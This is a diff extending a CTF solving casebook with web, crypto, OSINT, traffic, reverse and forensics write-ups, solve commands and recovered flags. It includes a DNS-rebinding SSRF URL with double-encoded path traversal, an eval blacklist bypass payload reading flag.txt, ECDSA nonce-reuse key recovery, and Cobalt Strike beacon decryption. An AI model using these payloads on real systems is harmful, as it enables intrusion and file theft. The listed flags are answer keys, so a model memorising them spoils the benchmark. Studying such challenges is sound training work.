@@ -1,6 +1,7 @@
 # ForgeFlag CTF Casebook
 
 This casebook records recent hands-on CTF solving patterns. Keep entries short, reproducible, and focused on signals that future solvers can recognize.
+For ad-hoc replay helpers that back these cases, keep [ForgeFlag Solve Scripts](solve-scripts.md) in sync with the casebook, playbook, README, and changelog.
 
 ## How To Use This Casebook
 
@@ -24,12 +25,12 @@ ForgeFlag has accumulated these stable pattern families across local fixtures, W
 | Category | Historical Patterns To Keep |
 | --- | --- |
 | Web | visible flags, hidden same-origin routes, static JS leaks, response headers/cookies, source-derived framework routes, API option leaks, JWT/session hints, SSRF hints, path traversal hints, LFI-to-artifact chains, status-feed object filtering |
-| Crypto | reversible encodings, Caesar/ROT/Morse/ASCII forms, XOR and supplied-key classical ciphers, unknown-key substitution/Vigenere hybrids, AES-CTR nonce reuse, AES-GCM nonce reuse, Poly1305 key reuse, RSA known factors, low exponent, prime modulus, Fermat close primes, common modulus, shared prime, broadcast e=3, modular matrix conjugation |
-| Forensics | raw strings, archives and comments, mail/PowerShell base64, PNG text chunks, PNG trailing data, IHDR height mismatch repair, independent/extra IDAT zlib payloads, JPEG comments/APP markers, encoded image metadata |
-| Traffic | HTTP payload flags, DNS split label exfiltration, TCP stream follow-up, HTTP object export, SMTP/FTP/IRC-style streams, AntSword/JSP webshell command/output reconstruction |
-| Reverse | static strings, packed/UPX markers, encoded string tables, custom protocol reassembly, esolang word mapping, stripped ELF phrase recovery |
+| Crypto | reversible encodings, Caesar/ROT/Morse/ASCII forms, XOR and supplied-key classical ciphers, unknown-key substitution/Vigenere hybrids, AES-CTR nonce reuse, AES-GCM nonce reuse, Poly1305 key reuse, RSA known factors, low exponent, prime modulus, Fermat close primes, common modulus, shared prime, broadcast e=3, modular matrix conjugation with bad-pivot factor mining, reversible right-shift XOR linear transforms, Python random seed/prime-offset replay, LCG state recovery, LFSR seed leaks, MT19937 cloning, LFSR/Berlekamp-Massey bitstream recovery with hash-prefix filtering |
+| Forensics | raw strings, archives and comments, mail/PowerShell base64, PNG text chunks, PNG trailing data, IHDR height mismatch repair, independent/extra IDAT zlib payloads, JPEG comments/APP markers, encoded image metadata, visual-cryptography image shares, Minecraft Anvil region orphan-sector lore recovery |
+| Traffic | HTTP payload flags, DNS split label exfiltration, TCP stream follow-up, HTTP object export, SMTP/FTP/IRC-style streams, AntSword/JSP webshell command/output reconstruction, delimited webshell command-output flags, corrupt PCAP record resync, IPv4 Identification stego |
+| Reverse | static strings, packed/UPX markers, encoded string tables, custom protocol reassembly, esolang word mapping, stripped ELF phrase recovery, `.rodata` table inversion |
 | Pwn | scoped service banner capture, source-level format string, source-level ret2win, CCTF pwn3 format string shell path, menu binary command overwrite through stack/heap logic |
-| Misc | binary/octal/decimal ASCII, nested transform chains, archive previews, PNG/JPEG puzzles, magic-extension mismatch, LSB extraction, pickle sandbox triage, hash fingerprinting, Krita/OpenDocument-style ZIP subtypes |
+| Misc | binary/octal/decimal ASCII, nested transform chains, archive previews, PNG/JPEG puzzles, magic-extension mismatch, LSB extraction, pickle sandbox triage, hash fingerprinting, Krita/OpenDocument-style ZIP subtypes, recipe-state puzzles, decayed DoubleHelix Ruby source recovery |
 
 ## Web Cases
 
@@ -90,7 +91,154 @@ Solver lesson:
 - WebSolver should extract source routes and attach bug-class hints: API option leak, JWT/session, SSRF, and path traversal.
 - For multi-stage cases, source-derived Web evidence should be allowed to route into ReverseSolver or ForensicsSolver when an artifact path is discovered.
 
+### IrisCTF 2024: LameNote
+
+Signal:
+
+- Source-attached Flask note app embeds its UI through an iframe and rejects non-iframe requests with `Sec-Fetch-Dest`.
+- `/search` tests whether a query is a substring of the current user's note title or text.
+- A single search result renders the note, and the note's image URL influences the response CSP.
+- The distributed adminbot/source layout may show the oracle shape while the benchmark only expects a lowercase `irisctf{[a-z_]+}` pattern rather than a concrete remote flag.
+
+Reproduction:
+
+```bash
+python3 scripts/solve_lamenote.py --dist .forgeflag/heldout-cache/irisctf2024/lamenote/dist
+```
+
+Solver lesson:
+
+- Treat owner-scoped note search as an oracle when an admin-only flag note exists in the authorized challenge browser context.
+- The published solve pattern uses an iframe/CSP/history side-channel to test `irisctf{prefix}` one character at a time.
+- If the local handout lacks the live adminbot's concrete flag, preserve the source-pattern proof separately from exact flag recovery. In the cleaned manifest this replay emits `irisctf{[a-z_]+}` intentionally, while the local demonstration recovers a synthetic `irisctf{lame_note}` value to prove the oracle mechanics.
+
+### WeasyPrint SSRF Guard Rebinding Plus Internal Path Traversal
+
+Signal:
+
+- Public frontend accepts a user URL and renders it to PDF with WeasyPrint.
+- The guard only pre-resolves the submitted hostname with `socket.getaddrinfo` and rejects private/loopback/link-local IPs.
+- A private service is bound to `127.0.0.1` in the same container or pod.
+- The private service serves files under a doc root and performs an extra URL decode after a superficial traversal check.
+
+Shortest path:
+
+```text
+Frontend: POST /api/report {"url":"http://<host>:8080/docs/<path>"}
+Guard:    hostname must resolve public during validation
+Renderer: WeasyPrint resolves and fetches the URL again
+Private:  /docs/%252e%252e%252f%252e%252e%252fflag.txt -> ../../flag.txt
+```
+
+Use a DNS rebinding host that alternates between a public IP and `127.0.0.1`; retry until the first resolution passes the guard and the renderer fetch resolves to loopback:
+
+```bash
+python3 scripts/solve_reportlab.py http://target/
+```
+
+Core URL shape:
+
+```text
+http://7f000001.01010101.rbndr.us:8080/docs/%252e%252e%252f%252e%252e%252fflag.txt
+```
+
+Solver lesson:
+
+- SSRF filters that validate DNS before handing a URL to another library are TOCTOU-prone; check whether the sink resolves again.
+- In renderers such as WeasyPrint, the main document URL and subresource URLs are both potential internal fetch sinks.
+- In Go services, remember that `net/http` decodes the path once before handlers see `r.URL.Path`; a later `QueryUnescape` can turn `%2e%2e%2f` into traversal after checks have already passed.
+
+## OSINT / Image Geolocation Cases
+
+### DownUnderCTF 2024: Bridget Lives And cityviews
+
+Signal:
+
+- Prompt asks which building a photo was taken from, not what landmark is visible.
+- Image contains distinctive bridge, skyline, hotel, billboard, or street-view clues.
+- Challenge accepts a case-insensitive building name wrapped as `DUCTF{...}`.
+
+Reproduction:
+
+```bash
+python3 scripts/solve_ductf_osint_building.py .forgeflag/heldout-cache/ductf2024/osint/bridget-lives
+python3 scripts/solve_ductf_osint_building.py .forgeflag/heldout-cache/ductf2024/osint/cityviews
+```
+
+Solver lesson:
+
+- For `Bridget Lives`, the local official writeup corroborates Google Lens/Images, Robertson Bridge, and Four Points by Sheraton, then normalizes the accepted building answer as `DUCTF{four_points}`.
+- For `cityviews`, the local official writeup preserves the 3AW Melbourne billboard, Great Southern Hotel, street-view cross-check, and Hotel Indigo Melbourne source building, then normalizes the answer as `DUCTF{hotel_indigo_melbourne}`.
+- This remains a manual OSINT replay pattern: preserve image SHA-256 and landmark evidence alongside the final flag so the benchmark is not just matching an answer string.
+
+### UMDCTF 2024: bro thinks hes hans zimmer
+
+Signal:
+
+- Prompt names Hans Zimmer and uses Dune vocabulary such as spice and stillsuit.
+- The handout image is a Street View panorama, but the flag format asks for a normalized musician or track name.
+- The local challenge metadata contains an oracle flag line, so replay must strip README `## Flag` sections and `challenge.yaml` `flag:` rows before deriving the answer.
+
+Reproduction:
+
+```bash
+python3 scripts/solve_hans_zimmer_osint.py --challenge-dir .forgeflag/heldout-cache/umdctf2024/osint/bro-thinks-hes-hans-zimmer
+```
+
+Solver lesson:
+
+- Cross-reference the prompt's composer/media clue against public soundtrack evidence: Hans Zimmer's Dune soundtrack includes `Gom Jabbar`.
+- Normalize the source-derived name with underscores under the UMDCTF wrapper, producing `UMDCTF{Gom_Jabbar}`.
+- For OSINT tasks, preserve the clue chain separately from the final answer, especially when the local repository includes challenge-author oracle metadata.
+
 ## Crypto Cases
+
+### Local PRNG And Stream Cipher Sample Pack
+
+Signal:
+
+- Local source files under `/Users/5haw0/学习/CTF/CRYPTO/prng and stream cipher` cover Python `random`, LCG, LFSR, MT19937, and toy streamgame generators.
+- Many files contain source-level flag placeholders plus output comments; solver evidence must replay the generator instead of accepting the first source literal.
+- Some cases require sidecar observations: `sgcc.txt` for mixed MT19937 chunks, `random.txt` plus partial-bit MT matrices for AES key recovery, and streamgame key bytes that are absent as standalone `key` artifacts in this folder.
+
+Replay command:
+
+```bash
+python3 scripts/solve_prng_stream_cipher_cases.py --json
+```
+
+Verified local results:
+
+```text
+BM.py -> de1ctf{1224473d5e349dbf2946353444d727d8fa91da3275ed3ac0dedeb7e6a9ad8619}
+easy_random.py -> ctf{true_0r_false??}
+easy_seed.py -> flag{just_a_seed}
+lcg1.py -> Spirit{0ops!___you_know__LCG!!}
+lcg2.py -> Spirit{Orzzz__number_the0ry_master!!}
+lcg3.py -> Spirit{Y0u_@r3_g00d_at__math}
+lcg4.py -> flag{1111122222333344440000}
+lcg5.py -> flag{just_a_simple_problem}
+lfsr1.py -> flag{a_simple_test}
+lfsr2.py -> flag{easy_lfsr2}
+mt1.py -> flag{mt19937_level1}
+mt2.py -> 0c563a3189a03d2e9413986889ec1af8
+mt3.py -> WKCTF{3f2af637b773613c18d27694f20d98fd}
+streamgame1.py -> flag{1110101100001101011}
+streamgame4.py -> flag{100100111010101101011}
+```
+
+Artifact caveats:
+
+- `lfsr3.py` is marked `artifact_drift`: the reference exp gives `flag{easy_lfsr3}`, but the local source/comment does not satisfy `assert key1 == key2`; do not promote that value as solver evidence from the source alone.
+- `bss_prng.py` is a BBS generator demo without flag, ciphertext, or challenge output.
+- `mt2.py` emits a raw MD5 digest rather than a wrapped flag; keep it as a digest result unless the platform statement says to submit the digest directly.
+- `streamgame1.py` and `streamgame4.py` are solved from key observations preserved in the reference exp because the standalone `key` artifact is missing from the local folder.
+
+Solver lesson:
+
+- Run PRNG replay before broad hash or transform triage; `lcg5.py` was initially intercepted by hash-like long integers, and `mt1.py` can be falsely solved from a source flag literal unless MT cloning is prioritized.
+- For LCG, implement all four common moves: known parameter forward/XOR, inverse recurrence, increment recovery from two outputs, and modulus recovery from six outputs. Add residue lifting when `seed mod n` is not the original flag integer.
+- For MT19937, preserve word accounting: full 624 32-bit outputs are default solver material; mixed-size `getrandbits` and 8-bit partial outputs belong in replay helpers until their matrix dependencies become a typed ForgeFlag adapter.
 
 ### Substitution Plus Unknown Vigenere
 
@@ -207,12 +355,126 @@ Solver lesson:
 - CryptoSolver should emit a Sage-oriented helper and record message/tag evidence.
 - This is an algebra route, not a wordlist/cracking route.
 
+### Halcyon Sealed Build: ECDSA Reused Nonce To AES-GCM Key
+
+Signal:
+
+- Ledger contains P-256 ECDSA signatures with `r` and `s` stored as raw integers.
+- Two release records reuse the exact same `r`.
+- The signed message hash is explicitly available as `signed_sha256`.
+- A small `.sealed` artifact is said to require the signer key to open.
+
+Shortest path:
+
+```python
+n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
+r = int(reused_r, 16)
+s1 = int(sig1_s, 16)
+s2 = int(sig2_s, 16)
+z1 = int(release1["signed_sha256"], 16) % n
+z2 = int(release2["signed_sha256"], 16) % n
+
+k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
+d = ((s1 * k - z1) * pow(r, -1, n)) % n
+```
+
+Validate `d` by deriving the P-256 public key and comparing it to the provided release public key. In this case the sealed blob was not a nested ECIES envelope. It was bare AES-256-GCM:
+
+```python
+key = sha256(d.to_bytes(32, "big")).digest()
+nonce = sealed[:12]
+tag = sealed[12:28]
+ciphertext = sealed[28:]
+plaintext = AESGCM(key).decrypt(nonce, ciphertext + tag, None)
+```
+
+Recovered token:
+
+```text
+SVIUSCG{n0nce_reuse_grounds_the_halcyon_fleet}
+```
+
+Solver lesson:
+
+- For ECDSA, repeated `r` is repeated nonce `k`; recover `k` and private scalar `d` before guessing envelope formats.
+- Use the challenge's actual signed hash field. Here `signed_sha256`, not `image_sha256`, was the ECDSA message digest.
+- After recovering a key, first test simple challenge-style seal formats such as `nonce || tag || ciphertext` keyed by `SHA256(private_scalar)` before overfitting ECIES/KEM layouts.
+
+### NUS Greyhats Welcome CTF 2024: i luv linear
+
+Category:
+
+- Crypto / reversible GF(2) linear transform.
+
+Signal:
+
+- Python source seeds `random` with a fixed value inside `enc`.
+- The integer plaintext is repeatedly transformed with `ct ^= ct >> random.randint(1, 32)`.
+- The script asserts `enc(flag) == b"..."` and constrains the flag length.
+
+Shortest path:
+
+```text
+recreate the 100 random shifts from seed 0
+walk the shifts backward
+invert each y = x ^ (x >> k) over the fixed bit length
+decode the recovered bytes
+grey{m4tr1ces_4re_s0_c00l_heheh}
+```
+
+Solver lesson:
+
+- This is linear algebra over GF(2), but it does not require Sage for the challenge shape. Each right-shift XOR step has a direct inverse using repeated doubled shifts.
+- Preserve seed, round count, shift range, ciphertext hex, and plaintext length so the replay is deterministic.
+- Run this before generic transform/classical routes when the source contains an `assert enc(flag) == bytes_literal` oracle.
+
+### Easy Random Python: xored seed and prime offsets
+
+Category:
+
+- Crypto / Python random seed recovery.
+
+Signal:
+
+- Source defines `key = b'...'`, prints a `gift` byte string, and comments that `c = a^b` / `a = b^c`.
+- `random.seed(bytes_to_long(seed))` feeds two `next_prime(random.randint(...))` values.
+- Final output is `bytes_to_long(flag)+t-r`.
+
+Shortest path:
+
+```text
+seed = key XOR gift
+random.seed(bytes_to_long(seed))
+t = next_prime(randint(2**20, 2**21))
+r = next_prime(randint(1000, 10000))
+flag_int = output - t + r
+long_to_bytes(flag_int)
+ctf{true_0r_false??}
+```
+
+Observed local case: `crypto-20260630-112308-easy-random-py/easy_random.py`.
+
+Evidence:
+
+- `key = b'fake_seed'`
+- `gift = b'\x12\x13\x1e\x00\x00\x1f\n\x13\x01'`
+- `seed = b'true_love'`
+- `t = 1713221`, `r = 9533`
+- output integer `567785900217270586430439246129051365510368280197` becomes `ctf{true_0r_false??}`.
+
+Solver lesson:
+
+- Do not stop at generic transform candidates when a Python random script contains a recoverable byte seed and small prime offsets.
+- This pattern needs no `gmpy2` at runtime; a small Miller-Rabin `next_prime` helper is enough for the CTF-sized ranges.
+- Preserve seed text/hex, `gift_hex`, randint bounds, `t`, `r`, and the output integer in replay evidence.
+
 ### RSA Weak Parameter Families
 
 Signals and first moves:
 
 - Known `p`/`q`: compute `phi`, `d`, decrypt.
 - Low exponent without padding: test exact integer roots.
+- Low exponent modulo `n` with source hints such as `iroot(c+n*i,e)`: infer `e`, use the `range(...)` bound as the replay search window, and find the smallest `k` where `c + k*n` is an exact `e`-th power.
 - Prime modulus: use `phi = n - 1`.
 - Close primes: Fermat factorization.
 - Common modulus: combine ciphertexts with extended gcd on exponents.
@@ -224,6 +486,7 @@ Signals and first moves:
 Solver lesson:
 
 - CryptoSolver should normalize numbered fields such as `n1/e1/c1`, `n2/e2/c2`, and unnumbered `n/e/c`.
+- Source-backed low-exponent RSA should preserve `root_multiplier` and `root_search_limit` in evidence so the write-up can explain why the flag came from `c + k*n`.
 - Every recovered RSA case should produce a replayable solve script, not only a finding.
 
 ### RSA Prime High-Bits Coppersmith
@@ -457,6 +720,16 @@ Reproduction strategy:
 - Use the recovered `A` to decrypt live matrices: `M = A C A^-1 mod n`.
 - Decode each plaintext matrix entry into bytes according to the provided chunk size.
 
+Observed case: `SAR Grid`
+
+- Artifact shape: `matrix_size: 2`, `chunk_size: 8`, `known_pairs`, `flag_ciphertexts`, and a composite-looking `modulus`.
+- Direct elimination over `mod n` failed on a non-unit pivot; `gcd(pivot, n)` revealed the prime factor `61145780317515047888166487409711708700820449221189208898310462218728231038219`.
+- Solving in `GF(p)` verified all known pairs; decrypting live matrices and reading the first entry as 8-byte big-endian chunks recovered:
+
+```text
+SVIBGR{gr1d_w@s_spl1t_just_l1ke_my_h34rt_wh3n_1_h3ard_fukash1gi_n0_c4rte_1s_3nding_:(}
+```
+
 Solver lesson:
 
 - CryptoSolver should detect conjugation equations and produce a modular linear algebra solve script.
@@ -464,6 +737,46 @@ Solver lesson:
 - If only one plaintext matrix position carries printable chunks, score entries by printable byte ratio and flag-format prefix before choosing the decode path.
 
 ## Traffic Cases
+
+### Corrupt PCAP Record Resync Plus IP-ID Stego
+
+Signal:
+
+- `tshark` parses only the first few frames and then reports a damaged classic PCAP record, such as a packet length bigger than the maximum.
+- Raw bytes still contain later HTTP or TCP clues, so the capture is not just truncated.
+- Recovered traffic contains repeated short packets with payload such as `where is the flag?`; the flag bytes are not in the payload but in IPv4 Identification values.
+
+Reproduction:
+
+```bash
+PYTHONPATH=src python3 -m forgeflag.cli --db .forgeflag/notebook.sqlite run traffic-20260630-113906-findtheflag-cap --llm-provider disabled
+tshark -r .forgeflag/artifacts/traffic-20260630-113906-findtheflag-cap/pcap-repairs/findtheflag/findtheflag-resync.cap -Y 'tcp.dstport==2222 && frame contains "where is the flag?"' -T fields -e frame.number -e ip.id -e data.data
+```
+
+Observed local case: `traffic-20260630-113906-findtheflag-cap/findtheflag.cap`.
+
+Decisive evidence:
+
+- Original SHA-256: `a46e7c4f93bcb15fe2e103140960b71244854e7e232b7fa09b1a89ee02a0fdf8`.
+- The first corrupt jump occurs at record 18: old `incl_len=386`, corrected to `377`, with the next plausible record header at offset `2307`.
+- Record resync recovers about 1600 records and writes `pcap-repairs/findtheflag/findtheflag-resync.cap`.
+- Marker packets to `tcp.dstport==2222` expose adjacent-duplicated IP-ID words:
+
+```text
+0x6c66 0x6761 0x617b 0x6168 0x5f21 0x6f79 0x5f75 0x6f66 0x6e75 0x5f64 0x7469 0x7d21 0x0000
+```
+
+Decode each IP-ID as a little-endian two-byte pair after adjacent de-duplication:
+
+```text
+flag{aha!_you_found_it!}
+```
+
+Solver lesson:
+
+- TrafficSolver should not stop when tshark reports a corrupt PCAP record length; classic PCAP headers can be resynchronized by scanning for plausible timestamp and length tuples.
+- After resync, inspect packet header fields as carriers. IPv4 Identification values are a common two-byte-per-packet stego lane.
+- Preserve the repaired capture path, original/repaired hashes, repair offsets, marker packets, IP-ID sequence, and decoded flag candidate.
 
 ### AntSword/JSP Webshell PCAP Reconstruction
 
@@ -526,6 +839,163 @@ Solver lesson:
 
 - Store stream IDs, exported object paths, hashes, previews, and recovered flag candidates.
 - The write-up should include the exact stream ID or object filename.
+
+### HTTP Webshell Delimited Command Output
+
+Signal:
+
+- PCAP contains HTTP requests to a shell-like path such as `/shell.php`.
+- HTTP response bodies wrap command output with delimiters such as `X@Y`, `[S]`, `[E]`, and a current working directory.
+- A generic marker such as `flag{...}` may sit immediately after wrapper bytes, for example `X@Yflag{...}`.
+
+Reproduction:
+
+```bash
+tshark -r key.pcapng -q -z io,phs
+tshark -r key.pcapng -Y http.file_data -T fields -e frame.number -e tcp.stream -e http.request.uri -e http.response.code -e http.file_data
+tshark --export-objects http,out -r key.pcapng
+rg -n "flag\\{|\\[S\\]|\\[E\\]|X@Y" out
+```
+
+Observed local case: `traffic-20260630-110523-key-pcapng/key.pcapng`.
+
+Decisive evidence:
+
+- `http.file_data` frame 105 decodes to `X@Yflag{This_is_a_f10g} [S] /var/www/html [E] X@Y`.
+- HTTP object export writes a small `shell(3).php` response body with the same command output.
+- The first failed ForgeFlag run decoded the string but did not promote `flag{This_is_a_f10g}` because the flag marker was adjacent to delimiter text; the regression now extracts embedded generic `flag{...}` / `f1ag{...}` markers and report paths prefer the latest direct candidate evidence over stale payload matches.
+
+Solver lesson:
+
+- TrafficSolver should scan decoded HTTP artifact text and exported object previews for embedded generic flag markers, not only boundary-separated platform prefixes.
+- Replay reports should prefer findings whose `flag_candidates` directly contain the accepted flag when older runs also include the flag as incidental decoded payload text.
+
+### Data URI Image In A Raw TCP Stream
+
+Signal:
+
+- PCAP has no normal HTTP objects, but `strings` reveals a long `data:image/jpg;base64,...` payload.
+- Protocol hierarchy may be noisy or misleading, such as discovery traffic plus an unrelated industrial protocol stream.
+- One TCP stream contains a single large printable payload rather than a full HTTP request or response.
+
+Reproduction:
+
+```bash
+capinfos /Users/5haw0/Downloads/9.pcap
+tshark -r /Users/5haw0/Downloads/9.pcap -q -z io,phs
+tshark -r /Users/5haw0/Downloads/9.pcap -q -z conv,tcp
+python3 scripts/solve_pcap9_data_image.py /Users/5haw0/Downloads/9.pcap
+```
+
+Observed case: `9.pcap`
+
+- Capture: 5799 packets, 520 KB, about 112 seconds.
+- Main protocol noise: Modbus/TCP between `192.168.99.79` and `192.168.99.31:502`, plus WS-Discovery/SSDP.
+- Decisive carrier: raw TCP stream 2 from `192.168.99.79:25697` to `192.168.99.31:29793` starts with `data:image/jpg;base64,`.
+- Decoded JPEG SHA-256:
+
+```text
+b11655f4bb764148c6057ab28046a75cc96ce9752566bd0fadccca0c91c00d3b
+```
+
+The extracted image visibly contains:
+
+```text
+flag{4eSyVERxvt70}
+```
+
+Solver lesson:
+
+- TrafficSolver should search raw payload bytes for `data:image/` and other data URI carriers, not only HTTP object export.
+- For visual flags, save the decoded artifact and record its hash. If OCR is unavailable, the write-up should still preserve the exact extraction path and visible text.
+
+### IrisCTF 2024: Spicy Sines
+
+Category:
+
+- Traffic / radio-frequency image waveform.
+
+Signal:
+
+- The handout is a wide PNG waveform, not a packet capture.
+- The prompt/category points to radio-frequency traffic and a public write-up identifies the modulation family as ASK/OOK with Manchester-style line coding.
+- The blue trace has a measurable carrier period; the Manchester half-bit width is close to twice that period.
+
+Shortest path:
+
+```text
+load spicy-sines.png as RGB pixels
+extract the blue-dominant trace column by column
+center the y trace and smooth squared amplitude into an envelope
+estimate carrier period around 12 px
+search Manchester half-bit widths near 2 * carrier_period and start offsets
+decode low-high pairs as data bit 1, high-low pairs as data bit 0
+recover irisctf{c0ngrats_y0uv3_d3feat3d_ook_th3_m0st_b4sic_f0rm_of_ask}
+```
+
+Solver lesson:
+
+- TrafficSolver should not assume traffic means only PCAP. RF/radio CTF handouts can be image artifacts that still represent traffic bits.
+- Preserve `rf_image_waveform` evidence with `carrier_period_pixels`, `half_bit_width`, `byte_aligned_start_offset`, `manchester_mapping`, and `flag_candidates`.
+- Use carrier-period guided timing search instead of a fixed bit width; the real image needs a fine width near `23.95` pixels and fails at a rounded `24.00`.
+
+### Laravel Webshell To Cobalt Strike Beacon Decryption
+
+Signal:
+
+- HTTP traffic shows Laravel Ignition probes such as `/_ignition/execute-solution/`, followed by a hidden PHP webshell path such as `/.config.php`.
+- Webshell responses list project directories and suspicious archives, for example `secret/secret.zip`.
+- A later host begins periodic scripted HTTP polling to a fixed path such as `/en_US/all.js`.
+- Exported HTTP objects or webshell output reveal `.cobaltstrike.beacon_keys`.
+
+Shortest path:
+
+```bash
+tshark -r capture.pcapng -q -z io,phs
+tshark -r capture.pcapng -Y http.request \
+  -T fields -E separator='|' \
+  -e frame.number -e ip.src -e ip.dst -e tcp.stream \
+  -e http.request.method -e http.host -e http.request.uri -e http.user_agent
+tshark -r capture.pcapng -Y http.file_data -T fields -e http.file_data
+python3 scripts/solve_traffic_1178.py challenge.zip
+```
+
+Observed chain for `traffic-1178`:
+
+```text
+192.168.132.130 -> 192.168.132.138  Nmap and Laravel Ignition probing
+192.168.132.130 -> 192.168.132.138  POST /.config.php webshell traffic
+192.168.132.138 -> 192.168.132.128  GET /en_US/all.js Beacon polling
+```
+
+The webshell listed `D:\phpstudy_pro\WWW\secret\secret.zip`, then ran:
+
+```text
+"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y
+```
+
+The extracted `.cobaltstrike.beacon_keys` is a Java serialized `KeyPair`. The private key contains a PKCS#8 DER blob beginning with ASN.1 marker `30 82 02 77`. Use it to decrypt the Beacon metadata cookie. The decrypted metadata begins with magic `00 00 be ef`; bytes 8-23 are the raw Beacon key.
+
+The final solver script derives:
+
+```text
+raw Beacon key: b555de5dce3b9e3eb4b5722f6aa6bc85
+AES key: SHA256(raw_key)[:16]
+HMAC key: SHA256(raw_key)[16:]
+metadata: DESKTOP-QQF0MLN | Administrator | beacon.exe
+```
+
+HTTP response bodies and result posts are AES-CBC with zero IV and a trailing 16-byte `HMAC-SHA256` prefix over the ciphertext. Decrypted client results show `D:\flag\flag.txt`. The directory listing reports `flag.txt` as 42 bytes. The type-output packet shows the UUID body and the four bytes immediately before it decode to `flag` via the packet's `mnop` XOR transform, giving the complete file contents:
+
+```text
+flag{787fc697-8773-4669-84ad-94f714e7df09}
+```
+
+Solver lesson:
+
+- TrafficSolver should not stop at finding a webshell or C2 path. If a PCAP contains `.cobaltstrike.beacon_keys`, recover the Java serialized RSA key pair, decrypt the metadata cookie, derive AES/HMAC keys, and decrypt Beacon task/result packets.
+- Webshell command reconstruction needs to handle prefixed Base64 form fields. If decoded bytes are shifted by a random prefix, try Base64 decoding from offsets 0-3 before assuming the command is encrypted.
+- Reports should name the exploit chain, stream/path pivots, recovered Beacon identity, key material, and the decrypted packet that contains the flag.
 
 ### Internal Web App Pivot To Business Data
 
@@ -747,6 +1217,28 @@ Reproduction strategy:
 - Reconstruct the expected phrase with a Python script rather than brute forcing. For a check like `((input[i] ^ 0x13) + i) & 0xff == table[i]`, invert each byte as `input[i] = ((table[i] - i) & 0xff) ^ 0x13`.
 - Verify statically by reapplying the recovered formula to the candidate phrase; dynamic execution is optional when the host architecture or container image is unavailable.
 
+Observed case: `beacon_override`
+
+```bash
+file beacon_override
+strings -a beacon_override
+objdump -d -M intel beacon_override
+objdump -s -j .rodata beacon_override
+```
+
+The useful path was fully static:
+
+- Stripped dynamically linked x86-64 ELF.
+- `readelf` was unavailable, so `objdump` was the reliable fallback.
+- The helper at `0x4011d2` required exactly `0x17` bytes.
+- Each byte was checked as `((input[i] ^ 0x13) + i) & 0xff` against a 23-byte table at `.rodata:0x402130`.
+
+Recovered phrase:
+
+```text
+SVIBGR{b3ac0n_0v3rr1d3}
+```
+
 Solver lesson:
 
 - ReverseSolver should pair prompt strings with nearby validation logic in disassembly.
@@ -802,6 +1294,64 @@ Solver lesson:
 - ReverseSolver should detect packer indicators and record the next safe step before treating missing strings as a dead end.
 
 ## Forensics And Misc Cases
+
+### HTB Cyber Apocalypse 2024: [Easy] Unbreakable
+
+Category:
+
+- Misc / Python eval blacklist bypass.
+
+Signal:
+
+- Source appends `()` to user input and evaluates it with `eval(ans + '()')`.
+- A substring blacklist blocks shell-looking tokens, digits, braces, underscores, spaces, `import`, `eval`, `os`, and the letters `b` / `s`.
+- The filter still allows `print`, `open`, `read`, single quotes, comma, dot, parentheses, and `#`.
+- The public handout is source-only and does not include the remote `flag.txt`.
+
+Shortest replay path:
+
+```text
+parse the source blacklist
+build print(open('flag.txt','r').read())#
+verify the payload contains no blocked substring
+run the source locally with a challenge-scoped flag.txt fixture
+recover HTB{3v4l_0r_3vuln??}
+```
+
+Solver lesson:
+
+- When a challenge appends syntax after user input, look for comment or string-literal termination before trying heavier Python introspection.
+- Source-only replays should say when a local `flag.txt` fixture is injected because the remote flag file was not shipped; that proves the payload path, not independent flag discovery from the attachment.
+- Preserve `blacklist_safe`, payload text, and the exact source line shape as replay evidence.
+
+### NUS Greyhats Welcome CTF 2024: EE2026
+
+Category:
+
+- Misc / FPGA reverse engineering.
+
+Signal:
+
+- The handout is a Vivado project ZIP plus an assignment PDF for a Basys3 seven-segment task.
+- The original HDL source is missing, but `graded_post_lab_assignment_1.runs/synth_1/main.dcp` is a ZIP checkpoint containing `main.edf`.
+- The EDIF netlist is tiny: two `LUT5` instances, one `LUT6`, switch input buffers, LED outputs, seven-segment outputs, and anodes.
+
+Shortest replay path:
+
+```text
+extract main.dcp from graded_post_lab_assignment_1.zip
+open main.dcp as Zip and read main.edf
+parse LUT INIT values 32'h00000008, 32'hFEFFFFFF, 64'h0010000000000000
+enumerate SW0..SW9 until LD15 is high -> SW1,SW2,SW4,SW8 -> 1248X
+map active-low segment/anode outputs through the assignment table -> A=2, B=G, C=8
+recover grey{21248xG8}
+```
+
+Solver lesson:
+
+- Vivado `.dcp` checkpoints can be ordinary ZIP containers; try archive extraction before assuming proprietary tooling is required.
+- For small combinational netlists, parse EDIF `net` joins and LUT `INIT` values, then simulate the graph instead of relying on GUI schematic inspection.
+- Preserve the recovered switch set, LUT INITs, active-low display mapping, and final student ID as replay evidence.
 
 ### Truncated ZIP With Missing EOCD
 
@@ -951,6 +1501,49 @@ Solver lesson:
 - Treat clean `psaux`, `envars`, `lsof`, and socket output as a clue to inspect VMA contents rather than as a dead end.
 - Small anonymous `rwx` pages are high-signal; dump them first, then scan heap and stack if needed.
 
+### Windows REG NetworkList WiFi Name
+
+Signal:
+
+- Artifact is a Windows Registry export (`.reg`) in UTF-16LE.
+- Challenge asks for the Wi-Fi name used by a host.
+- `NetworkList` has both generic profile names and a specific `Nla\\Wireless` key.
+
+Reproduction:
+
+```bash
+file /Users/5haw0/Downloads/zhucebiao.reg
+iconv -f UTF-16LE -t UTF-8 /Users/5haw0/Downloads/zhucebiao.reg \
+  | sed -n '539760,539820p'
+python3 scripts/solve_zhucebiao_wifi.py /Users/5haw0/Downloads/zhucebiao.reg
+```
+
+Observed case: `zhucebiao.reg`
+
+- `NetworkList\\Nla\\Wireless` default value:
+
+```text
+4F50504F2052656E6F
+```
+
+- Hex-decoding this UTF-8 string gives:
+
+```text
+OPPO Reno
+```
+
+- The same value appears under `NetworkList\\Profiles` as `ProfileName` and `Description`.
+- The challenge asked for no spaces inside `flag{}`, so the submitted flag is:
+
+```text
+flag{OPPOReno}
+```
+
+Solver lesson:
+
+- In Windows registry exports, `NetworkList\\Profiles` may include generic names such as `网络`; prefer `NetworkList\\Nla\\Wireless` when the task specifically asks for Wi-Fi SSID.
+- SSID values may be hex-encoded in registry key values. Decode hex to UTF-8/ASCII before formatting the flag.
+
 ### JPEG-Appended Nintendo DS ROM Bitmap Text
 
 Signal:
@@ -1056,6 +1649,89 @@ Reproduction strategy:
 Solver lesson:
 
